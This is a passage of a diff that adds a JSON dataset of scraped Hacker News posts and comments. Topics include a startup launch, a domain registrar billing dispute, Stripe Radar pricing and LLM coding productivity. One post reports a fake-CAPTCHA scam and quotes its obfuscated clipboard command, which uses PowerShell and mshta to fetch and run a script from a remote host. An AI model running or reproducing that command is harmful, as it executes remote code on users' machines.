interesting!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49109721",
+      "title": "Launch HN: Prized (YC S26) – Let non-engineer staff build secure internal tools",
+      "link": "https://prized.dev",
+      "domain": "prized.dev",
+      "author": "marinoseliades",
+      "score": 68,
+      "comment_count": 48,
+      "created_ts": 1785418143,
+      "is_internal": false,
+      "post_text": "Hi HN, we&#x27;re Marinos and Hudson, founders of Prized (<a href=\"https:&#x2F;&#x2F;prized.dev\">https:&#x2F;&#x2F;prized.dev</a>)! Prized lets non-engineer employees describe the internal tool they need and get a full-stack app, wired to their company’s data and deployed behind the company’s sign-in, without them ever juggling API keys or connectors.<p>Here&#x27;s a demo: <a href=\"https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=730MuYOfZTY\" rel=\"nofollow\">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=730MuYOfZTY</a><p>The way Prized provides security is by limiting what the agent can reach at the network layer and by keeping credentials out of the sandbox entirely. The sandbox never holds any keys or connector secrets, it only uses scoped session tokens that are stored as opaque placeholders. The real values are swapped into the request headers on our egress proxy. When production data is connected, the sandbox&#x27;s network policy is set to deny by default so the only path out is via the proxy. Any call the agent makes to an external connector is reviewed by an LLM judge to prevent dangerous operations.<p>Prized is meant for the internal workflows that start as notebooks or spreadsheets but never become real tools because engineering has more important things to work on. One customer’s data scientist pasted in his personal fraud-detection notebook with hardcoded thresholds and all. After a few prompts, it became a published risk console connected to the company’s data with those thresholds turned into UI controls. Earlier today, we got off a call with them and most of their company is using it.<p>To do this, you need to give people the freedom to build without having unaudited access to company systems. We allow admins to scope data to specific users or teams and data access is recorded in an audit log. Each tool is built with its own Postgres schema and role, with queries running via an authenticated SQL gateway as that role.<p>We think Prized sits between products like Lovable and Retool. Lovable makes it easy to generate and host software, but it isn’t designed around distribution with permissions. Retool generally assumes that a technical builder is creating an app for an end user.<p>Prized treats internal tools as shared objects. Anyone in the workspace can see what others have built, fork, and connect different data. For example, one customer’s marketing lead built a promotional analytics tool. A data scientist at the same company then forked it and added confidence intervals with the existing tool as a starting base. This way workspaces become libraries of tools that people can reuse.<p>We’re live and self-serve. Our free tier includes 2 tool builds&#x2F;month and our Teams tier is $100&#x2F;month. The Enterprise tier is custom and supports personalized features like on-prem deployment.<p>We&#x27;re still working out the right boundary between control and freedom. If you&#x27;ve built internal tools before we&#x27;d appreciate your feedback!",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "enterprise",
+        "feedback",
+        "lead"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49099021",
+      "title": "Ask HN: My domain registrar rug-pulled me for $3000 [fixed]",
+      "link": "https://news.ycombinator.com/item?id=49099021",
+      "domain": "news.ycombinator.com",
+      "author": "shrinks99",
+      "score": 63,
+      "comment_count": 59,
+      "created_ts": 1785339988,
+      "is_internal": true,
+      "post_text": "I registered the domain onlyfans.sexy ~6 years ago as a gag where I&#x27;d post pictures of fans (everything on the site and in this post is SFW).  This year I got an email stating that, like all prior years, the domain would auto-renew at $38 in seven days and didn&#x27;t think anything of the next two emails also notifying me that the domain would auto-renew.<p>It would seem that I very much SHOULD have paid attention to those next two emails, because in both the three and one day renewal emails the price changed from $38 to $3000.  Needless to say, I was surprised when I was billed $3k USD (plus tax).<p>After contacting Hover&#x27;s customer support, they told me that there was nothing that they could do about this and they have a no refund policy because &quot;Hover does not have the ability to override or reverse pricing set by the registry. Premium domain pricing, including renewal costs, is determined by the registry, and they may adjust those prices over time. Once a renewal has been processed, we are charged that fee immediately by the registry, and those charges are non-refundable to us.&quot;<p>So according to Hover, the .sexy registry (Uniregistry) sets prices as it sees fit, decided to jack up the renewal cost at the last minute because they can, and there&#x27;s simply nothing they or I can do about it. Has anyone here experienced anything similar?",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": [
+        {
+          "top": "I work at Tucows Domains/Hover and we're digging in on what happened here. I've reached out to the OP already via email. tl;dr our support team didn't handle this well at all and we've already issued a full refund.\nWe are still looking into where the price mismatch found its way into the picture, but that domain is a tiered price domain but it is also \"legacy\" priced meaning it should renew at something very close to the standard price for a renewal but didn't.",
+          "author": "james_pm",
+          "replies": [
+            {
+              "text": "For anyone reading the thread, they did do this!  Had a nice call with James too, which I appreciate.\nIt looks like the situation is actually more complex and interesting than \"The registry rug-pulled me\".  My .sexy domain price was increased by the owners of .sexy (to $3000) since I bought it 6 years ago BUT in Hover's system it was supposed to retain the legacy price of $38 as it had for the past few years.  Something went wrong between Hover and the registry where the legacy price wasn't honoured and as such, it bumped to $3000 on renewal.  Apparently support really flubbed this one and we both agreed that going the \"post on HN\" route for customer service isn't exactly a win on their part.\nThe money has been refunded and I've been assured they're looking into the bug.  Will probably do a follow up blog post!",
+              "author": "shrinks99",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "Thankfully a chargeback is possible here. While a chargeback is almost always \"possible\" it can be dangerous if the company you are charging-back is the only provider of a service. I'd be wary about doing a chargeback on the Google/Amazon's of the world but Hover? There are many other registrars out there if you are willing to transfer and for $3K I'd be transfering my domains and then filing a chargeback.\nBUT, before you do that, threaten a chargeback. That might unstick their support or get your case bumped up the chain. If they still refuse then transfer and chargeback.",
+          "author": "joshstrange",
+          "replies": [
+            {
+              "text": ">There are many other registrars out there if you are willing to transfer and for $3K I'd be transfering my domains and then filing a chargeback.\nIf what hover said is true (ie. \"the .sexy registry (Uniregistry) sets prices as it sees fit, decided to jack up the renewal cost at the last minute because they can\"), trying to transfer to another \nregistar\n won't fix the issue, because they'll just charge the same price.",
+              "author": "gruez",
+              "depth": 1
+            },
+            {
+              "text": "It will fix the problem of having paid $3000. Just want to add that while Hover might not be at fault, I don't think OP is either. I would have done the same thing (read the first renewal email and ignored the rest). I think Hover should change something, like adding \nPRICE CHANGE\n to the email headline or something similar.",
+              "author": "ktm5j",
+              "depth": 2
+            },
+            {
+              "text": "True, but you can abandon that domain (OP already said it was mostly a joke website) and transfer all the ones you do care about. If this .sexy domain is their only domain there then it's even easier, just chargeback and be done with it.",
+              "author": "joshstrange",
+              "depth": 2
+            },
+            {
+              "text": "Charge backs are generally not for returns.\nIf the charge was legal and within contract and customer regulations, then Hover might very well just challange the charge back.",
+              "author": "tossandthrow",
+              "depth": 3
+            },
+            {
+              "text": "I think the OP has a pretty good case for this being an unauthorized charge.\nAdditionally, as someone who has been on the receiving end of chargebacks a number of times I can tell you merchants have a higher burden of proof in things like this. Even submitting perfect evidence can get ruled in favor of the cardholder.",
+              "author": "joshstrange",
+              "depth": 4
+            }
+          ]
+        },
+        {
+          "top": "Had a thing with Hostgator once where they wouldn't accept any proof of who I was other than an expired credit card that had long since stopped being used. The site went up for sale, and someone bought it and had it up for resale for around $5,000. Turned me even sourer on the domain system of the normal net.",
+          "author": "thataccount",
+          "replies": [
+            {
+              "text": "Heh yeah, I've recently had another site succumb to the same thing (that domain wasn't managed by me).  I've long accepted that domains are kind of a racket, but haven't actually been on the losing end of the money until now!",
+              "author": "shrinks99",
+              "depth": 1
+            }
+          ]
+        },
+        {
+          "top": "You are paying for a domain on a gTLD, which is owned by an organization that can charge whatever it wants, and thousands to tens of thousands a year isn't uncommon.  Your registrar is only charging tens of dollars a year for their services and they aren't involved in the price hike.\nICANN started selling gTLDs in 2012 and they are not cheap, costing hundreds of thousands to procure, plus tens to hundreds of thousands a year to maintain, which is why prices for domains on that gTLD are usually pricey, too.\nThere's probably not much you can do, as you need to dispute with the owner of the gTLD, not the registrar, but in the future I recommend switching to either a traditional TLD (e.g. .com, .org, .net, etc.) for the lowest price or a country code (e.g. .io .tv .gg, etc.) which is usually pricier than a traditional TLD but much cheaper than a gTLD.",
+          "author": "dlcarrier",
+          "replies": [
+            {
+              "text": "> “… which is owned by an organization that can charge whatever it wants…”\nSure, but how can the price change at the last moment like this?",
+              "author": "xtiansimon",
+              "depth": 1
+            },
+            {
+              "text": "Not exactly. We’re a common law country, and there is an implied covenant of good faith.  It’s for a judge to decide if this price change counts as good faith.  OP should file a complaint and let a judge decide.",
+              "author": "tonymet",
+              "depth": 1
+            },
+            {
+              "text": "Are you in the Cayman Islands?  It looks like that's where the owner of the gTLD, Internet Naming Co., is based.  Did you mean commonwealth or common law?  Either way, their pricing is in line with other gTLD providers and there's no sign that they didn't violate any territory's regulations or ICANN policy, so there's not really any reason for a judge to rule against the gTLD provider.\nA method for a more likely success to contact the gTLD provider and ask if a cancellation is possible.\nEdit: It looks like the registrar got in contact with shrinks99 (\nhttps://news.ycombinator.com/item?id=49099021#49100427\n) who qualified for grandfathered price that was accidentally not applied.",
+              "author": "dlcarrier",
+              "depth": 2
+            },
+            {
+              "text": "common law. and both the registrar and the gtld have american entities you can bring to court. otherwise they wouldn't be collecting revenue.",
+              "author": "tonymet",
+              "depth": 3
+            },
+            {
+              "text": "The original pricing didn't break any US regulations.  Of course, anyone can bring anyone else to court for any reason, but if the defendant didn't break any regulations, the plaintiff won't prevail, and publicly asserting that the defendant did so, when contrary to evidence, could leave the plaintiff liable for defamation.\nIt's also an awful place to start from, as a good-faith effort to settle the  matter is much cheaper for both sides, and the only way to prevail when no regulations were violated.",
+              "author": "dlcarrier",
+              "depth": 4
+            }
+          ]
+        },
+        {
+          "top": "As others said I think a chargeback is the way to go. I had a much smaller scale version of this happen where hover wanted to change $70 to renew a domain that Cloudflare would charge $30 for",
+          "author": "dividedcomet",
+          "replies": []
+        }
+      ]
+    },
+    {
+      "id": "49097990",
+      "title": "Teacher arrested for clapping in opposition at an AI data center meeting",
+      "link": "https://www.tomshardware.com/tech-industry/data-centers/teacher-arrested-for-clapping-in-support-of-opposition-at-an-ai-data-center-meeting-gigawatt-scale-project-gets-approved-anyway-despite-community-resistance",
+      "domain": "www.tomshardware.com",
+      "author": "rbanffy",
+      "score": 59,
+      "comment_count": 16,
+      "created_ts": 1785335302,
+      "is_internal": false,
+      "post_text": "",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "meeting"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49084404",
+      "title": "Ask HN: Crooked Timber showed showed me a virus captcha, What now?",
+      "link": "https://news.ycombinator.com/item?id=49084404",
+      "domain": "news.ycombinator.com",
+      "author": "Jgoauh",
+      "score": 43,
+      "comment_count": 47,
+      "created_ts": 1785248736,
+      "is_internal": true,
+      "post_text": "Hello everyone,\nThis morning, as i started my shift, i thought i would start visiting some news blogs &#x2F; websites to kick off the day. When it got to Crooked Timber i saw a captcha page instead, it looked like a traditional Google captcha.\nI clicked it, the spinner spun, and a box opened on the right, showing the traditional &quot;Verify you&#x27;re human&quot; white title on a blue background.<p>It showed 2 &quot;Manual Verification Steps&quot; :\n1. Press Win + R\n2. Press Ctrl + V and press Run<p>At first i assumed it was a new type of captcha checking i a physical keyboard was attached to the browser. But i instantly recognized the attempt to make me run a script on my machine.<p>I opened a new type and to my surprise, the something new was in my clipboard : \n&quot;pcalua -a &quot;PowerShell&quot; -c &quot;saps cmd &#x27;&#x2F;v&#x2F;c m^s^h^t^a h^t^t^p^s^:^&#x2F;^&#x2F;fine-work-team.com&#x2F;6272&#x27; -Wi Hi&quot;&quot;<p>I submited it to one of LLMs my work gives me access to, which told me to absolutly not run it (i wasn&#x27;t planning to) and explained the command would download and run a script from the URL.<p>How do i protect myself from these scams &#x2F; hack attempts in the future ? i always tought of myself &quot;prepared&quot; but i was surprised.<p>Has this happened to you before ? How do you protect yourself ?",
+      "is_ask_hn": true,
+      "matched_keywords": [
+        "team"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49058956",
+      "title": "Robotics development made dead simple (open source)",
+      "link": "https://news.ycombinator.com/item?id=49058956",
+      "domain": "news.ycombinator.com",
+      "author": "Ekami",
+      "score": 22,
+      "comment_count": 7,
+      "created_ts": 1785078806,
+      "is_internal": true,
+      "post_text": "Hey everyone,<p>My team and I have been working hard on this project: https:&#x2F;&#x2F;peppy.bot<p>It&#x27;s a direct replacement for ROS 2. We already have the OpenArm robot (https:&#x2F;&#x2F;openarm.dev) working on the platform, both v1.0 and v2.0, plus Isaac Sim and MuJoCo integration.<p>If you&#x27;re in a hurry, head over to https:&#x2F;&#x2F;docs.peppy.bot&#x2F;quickstart&#x2F; and get started in 5min.<p>Our long term vision is to allow anyone (even non-devs) to go from a prompt to real humanoid robot actions, first in simulation, then on the physical robot.<p>Happy to answer any question.",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "team"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49102371",
+      "title": "YC startup offers interviews to people who get their name permanently tattooed",
+      "link": "https://news.ycombinator.com/item?id=49102371",
+      "domain": "news.ycombinator.com",
+      "author": "codexon",
+      "score": 17,
+      "comment_count": 11,
+      "created_ts": 1785355751,
+      "is_internal": true,
+      "post_text": "Thought this was interesting. Clever recruitment tactic or too much?<p>linkedin.com&#x2F;posts&#x2F;jordan-zietz_7-people-left-our-yc-afterparty-with-permanent-activity-7487979543744614401-IFU-",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "startup"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49104392",
+      "title": "How to get more coding productivity with LLMs",
+      "link": "https://news.ycombinator.com/item?id=49104392",
+      "domain": "news.ycombinator.com",
+      "author": "DaveParkCity",
+      "score": 8,
+      "comment_count": 2,
+      "created_ts": 1785367690,
+      "is_internal": true,
+      "post_text": "As someone who is a lifelong programmer and entrepreneur, I&#x27;m here to say that 2-4-8x AI productivity boost is just the start. I&#x27;m currently benchmarking myself at 40-50x coding producivity with AI over 16 weeks, compared to pre-AI, and it&#x27;s increasing over time, and I am trying to find ways to share these techniques with more programmers. Here we go HN...<p>I measure in lines of code, which I know is an imperfect metric, but it&#x27;s the quantative metric I have, and I&#x27;m qualified to know it&#x27;s limits and say, this is real. I wrote and sold software in high school. I sold a company to Google when I was 27 for which I wrote half the code (Neotonic [1]). In that startup I wrote up to 60k LOC per year of Python, C, and html templates. With AI I&#x27;m producing that much in a week on average... over 16 weeks running. I mostly retired at 33, and here I am 52 and coding all day every day.<p>I use AI models a little differently than most I know. I wield them like a word-calculator, I don&#x27;t defer to them as if they are smart. (they are not. they are conservatively 100x worse at software design tradeoffs than a senior architect, but they are knowledgeable and they work very fast. They are &quot;the intern&quot; you always wished for)<p>I get there by doing at least these three key things differently:<p>1. <i>I turn off thinking while coding.</i> I frontload the design-time thinking and elaboration, into a design-spec and an implementation-spec, so by the time an agent is coding, I&#x27;ve resolved all the ambiguity myself. So I turn off thinking (or set it as low as I can), so the AI will stop revisiting things I already resolved. THis is especially important because my codebase is now over 350k LOC of interconnected layered abstrction, not a one-shot mobile app.<p>2. <i>I stay connected and read most of the verbal chat output</i> and I stop the AI when it says <i>anything</i> that is wrong or incongruent with the design I have in my head. Becuase that&#x27;s a sign that the LLM context is unaligned, that it misundertood something.<p>3. <i>I design the coding prioritization to get from A to B</i>... the ordering of the feature development, just like I would do myself, to minimize architecture risk, get the unknowns out of the way, feel the thing taking shape before the complexity layers in..Then build harnesses with as much AI visible iteration loop as is practical for the part we are working on. I use third-party oracle references when I can (like pixel correct font and shape tests against Skia, instead of just eyeballing) And I decide the level of detail where this is useful, then put the LLM in a place where it can succeed.<p>In short, it&#x27;s still me, building my software, my way. I&#x27;m trying my best to get the AIs to mirror the way I would do it, at every stage, because I find that process more productive. I&#x27;ve tried more hands-off eyes-off alternatives, and I would get rapid jumps and then spend entire days untangling some AI slop mess, and the codebases would just get so tangled around 60k LOC they became a morass, twice.<p>LLMs can code one-shot a mobile app. They can implement an algorithm mostly-correct from a research paper, and they can sometimes make semi-pretty UI. But they can&#x27;t (as of yet) intuit the right tradeoffs to meet your needs. They can&#x27;t decide what software to build, why you should build it, what parts of the software to build for flexibility in the future vs practicality now. What algorithms will be the best fit for the real world needs, none of it.<p>And what they do in those areas is worse than not-knowing. They confidently expound garbage. Absolute drivel. And so the most valuable skill you can have for being hyper productive with AI coding, is to beable to read fast enough to stay on top of it, and recognize the difference between the excellent execution and the drivel.<p>[1] https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Neotonic_Software",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "senior",
+        "startup"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49103837",
+      "title": "Ask HN: Is everybody's Claude weekly quota reset time the same?",
+      "link": "https://news.ycombinator.com/item?id=49103837",
+      "domain": "news.ycombinator.com",
+      "author": "0gs",
+      "score": 8,
+      "comment_count": 6,
+      "created_ts": 1785363606,
+      "is_internal": true,
+      "post_text": "maybe it&#x27;s like TM, and we&#x27;re not supposed to know.<p>for me, weekly reset is (has always been? surprisingly constant despite all the other UI&#x2F;UX&#x2F;model motion) 4P ET thursday, rain or shine, regardless of plan.<p>knowing what i know about software release cycles&#x2F;superstitions&#x2F;wisdom, it feels like it might be one and done. which would be nuts!<p>anybody know? apologies if dupe!",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49113688",
+      "title": "Stripe's opt-out Radar price increase dressed up as a free trial",
+      "link": "https://news.ycombinator.com/item?id=49113688",
+      "domain": "news.ycombinator.com",
+      "author": "rapind",
+      "score": 7,
+      "comment_count": 1,
+      "created_ts": 1785435618,
+      "is_internal": true,
+      "post_text": "https:&#x2F;&#x2F;support.stripe.com&#x2F;questions&#x2F;updates-to-radar-pricing-(january-2027)<p>Stripe just sent me an opt-opt notification about an automatic Radar upgrade. They&#x27;ve moved me to a &quot;Standard&quot; Radar plan because it&#x27;s &quot;closest&quot; to the free plan I was on.<p>It&#x27;s free until January 2027, after which they start charging me a per transaction fee (and per connect account), unless I opt out (which I just did).<p>I&#x27;m guessing everyone on similar Stripe plans will be effected. Wow, really guys? &quot;Opt-out&quot;??<p>Here&#x27;s a copy of the email I received (Canadian Stripe Connect rates quoted).<p>----------\nNew Stripe Radar plans and pricing<p>As fraud on the internet has accelerated over the past few years, we&#x27;ve been rapidly adding to Radar, our fraud prevention product. Last year, we prevented $110B in fraud, helped platforms block over 3 million fraudulent accounts and shipped dozens of new features. With so much new functionality, we&#x27;re introducing four tiers – Lite, Standard, Plus and Pro – and updating pricing.<p>What this means for you<p>The version of Radar you&#x27;ve been using is closest to Standard, and you&#x27;ve been receiving it for free. Starting today, you&#x27;ll receive a free trial of Radar Standard, which now includes broad protection across all payment methods and new capabilities built specifically for platforms – including account risk scores for every connected account, so you can onboard legitimate accounts faster, block high-risk ones, and pause payouts before fraud occurs.<p>After your trial ends on 22 January 2027, you&#x27;ll automatically move to Radar Standard and be charged CA$0.07 per screened transaction across your direct payment volume and any volume processed by your connected accounts, plus CA$1.50 per connected account for Radar&#x27;s new account fraud prevention capabilities.<p>If you prefer to continue receiving fraud protection for free, you can switch to Radar Lite for your direct payment volume or for your connected accounts in one click at any time from the Dashboard. Radar Lite provides essential fraud protection for card payments, powered by Stripe&#x27;s industry-leading AI models trained on more than $1.9T in annual payment volume. Radar Lite will be included at no additional cost with your payment processing.<p>Advanced protection with Plus or Pro<p>In the AI era, we expect new fraud patterns to emerge quickly. To stay ahead, you can upgrade to Radar Plus or Pro for advanced features like custom rules, reserves, Adaptive 3DS, protection against emerging fraud patterns like free trial abuse and more. As fraud evolves, so will Radar – we&#x27;re excited to keep improving to protect your business.<p>You can learn more about this pricing change on our support site or by reaching out to your account team.",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "team"
+      ],
+      "comments": [
+        {
+          "top": "I'm glad I saw this post! I didn't realize I even used Radar and archived the email after seeing the subject line. I only charge a handful of repeat clients every month and do not need their fraud protection.\nNot cool Stripe. Don't opt people in when it costs money!",
+          "author": "sydney1",
+          "replies": []
+        }
+      ]
+    },
+    {
+      "id": "49109652",
+      "title": "Ask HN: Navigating Source Code (especially on large projects)",
+      "link": "https://news.ycombinator.com/item?id=49109652",
+      "domain": "news.ycombinator.com",
+      "author": "thekey",
+      "score": 5,
+      "comment_count": 1,
+      "created_ts": 1785417865,
+      "is_internal": true,
+      "post_text": "- How much time you spend with navigating source code?\n- How annoyed you are about that?\n- What are your strategies to mitigate?\n- Are there tools you using?\n- What about polyglot navigation?\n- How you onboard other people &#x2F; point them to right locations - with context?",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49111330",
+      "title": "Ask HN: Grant Writers, Worth It?",
+      "link": "https://news.ycombinator.com/item?id=49111330",
+      "domain": "news.ycombinator.com",
+      "author": "Fundnai",
+      "score": 5,
+      "comment_count": 2,
+      "created_ts": 1785425072,
+      "is_internal": true,
+      "post_text": "",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49111613",
+      "title": "Ask HN: Do older programmers/CS academics view AI safety as a form of arrogance?",
+      "link": "https://news.ycombinator.com/item?id=49111613",
+      "domain": "news.ycombinator.com",
+      "author": "amichail",
+      "score": 4,
+      "comment_count": 12,
+      "created_ts": 1785426273,
+      "is_internal": true,
+      "post_text": "Maybe they have seen AI fail for so long due to poor performance that it makes AI safety experts seem like they are vastly overestimating what AI can do?",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    },
+    {
+      "id": "49113597",
+      "title": "I built an independent peptide testing lab that accepts mailed samples",
+      "link": "https://news.ycombinator.com/item?id=49113597",
+      "domain": "news.ycombinator.com",
+      "author": "peptidelabs",
+      "score": 4,
+      "comment_count": 0,
+      "created_ts": 1785435175,
+      "is_internal": true,
+      "post_text": "Hey HN, I built ACS Peptide Testing Labs, an ISO&#x2F;IEC 17025 accredited analytical lab in Florida that lets researchers and compounding pharmacies mail in peptide samples and get a full Certificate of Analysis back within 9–11 business days.<p>The problem was simple: most peptide suppliers provide their own COAs, which is a obvious conflict of interest. Researchers needed somewhere independent to send samples.<p>You submit through our web portal, ship overnight, and we run HPLC purity analysis, ESI mass spectrometry for identity confirmation, ICP-MS for heavy metals, and GC-MS for residual solvents. Results come back as a detailed COA via email.<p>One interesting constraint: we&#x27;re DEA registered, which lets us handle controlled substance analysis that most contract labs won&#x27;t touch.<p>We&#x27;re still expanding our custom protocol offerings and would genuinely love feedback from anyone working in peptide research or compounding.",
+      "is_ask_hn": false,
+      "matched_keywords": [
+        "feedback",
+        "conflict"
+      ],
+      "comments": []
+    },
+    {
+      "id": "49106471",
+      "title": "Ask HN: Should authors disclose if they are paid to write a blog post?",
+      "link": "https://news.ycombinator.com/item?id=49106471",
+      "domain": "news.ycombinator.com",
+      "author": "wseqyrku",
+      "score": 4,
+      "comment_count": 5,
+      "created_ts": 1785390640,
+      "is_internal": true,
+      "post_text": "Youtubers do this all the time.",
+      "is_ask_hn": true,
+      "matched_keywords": [],
+      "comments": []
+    }
+  ]
+}
